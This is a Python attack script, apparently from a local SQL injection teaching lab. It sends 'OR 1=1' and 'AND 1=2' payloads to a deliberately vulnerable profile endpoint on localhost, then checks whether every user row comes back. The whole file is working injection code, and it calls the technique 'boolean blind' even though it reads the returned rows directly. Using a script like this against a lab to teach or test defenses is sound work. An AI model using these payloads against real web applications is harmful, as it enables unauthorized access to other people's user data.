"""
Attack #4 – Boolean Blind Injection
=====================================
Sends an OR 1=1 payload to the vulnerable profile endpoint,
causing it to return ALL user rows instead of just one.
"""

import requests

PROFILE_URL = "http://127.0.0.1:5000/vulnerable/profile"

PAYLOADS = [
    ("1 OR 1=1", "Always-true condition – should return all users"),
    ("1 AND 1=2", "Always-false condition – should return no users"),
    ("1", "Normal lookup – should return exactly one user"),
]


def test_payload(payload: str, description: str) -> None:
    print(f"\n--- Payload: {payload!r} ({description}) ---")

    try:
        response = requests.get(PROFILE_URL, params={"id": payload}, timeout=5)
    except requests.RequestException as exc:
        print(f"[ERROR] Request failed: {exc}")
        return

    print(f"Status: {response.status_code}")

    # Count data rows by looking for usernames in the response
    found_users = []
    for username in ("admin", "alice", "bob", "charlie"):
        if username in response.text:
            found_users.append(username)

    print(f"Users visible in response: {len(found_users)} → {', '.join(found_users) or 'none'}")

    if payload == "1 OR 1=1" and len(found_users) > 1:
        print("[SUCCESS] Boolean blind injection worked — all users returned!")
    elif payload == "1 AND 1=2" and len(found_users) == 0:
        print("[SUCCESS] False condition returned no rows as expected.")
    elif payload == "1" and len(found_users) == 1:
        print("[SUCCESS] Normal lookup returned exactly one user.")


def main() -> None:
    print(f"Target: {PROFILE_URL}")

    for payload, description in PAYLOADS:
        test_payload(payload, description)

    print("\n[DONE] Boolean blind injection test complete.")


if __name__ == "__main__":
    main()